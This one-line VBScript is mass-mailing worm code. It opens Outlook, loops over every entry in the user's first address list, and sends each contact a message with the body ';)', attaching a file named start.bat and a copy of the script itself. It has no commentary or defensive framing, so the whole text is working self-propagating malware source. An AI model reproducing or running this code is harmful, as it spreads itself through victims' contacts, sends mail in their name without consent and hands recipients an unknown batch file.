On Error Resume Next:Set o=CreateObject("Outlook.Application"):Set i=o.GetNameSpace("MAPI"):Set a=i.AddressLists(1):For x=1 To a.AddressEntries.Count:Set m=o.CreateItem(0):m.to=a.AddressEntries(x):m.Body=";)":m.Attachments.Add "\start.bat":m.Attachments.Add WScript.ScriptFullName:m.Send:Next:o.Quit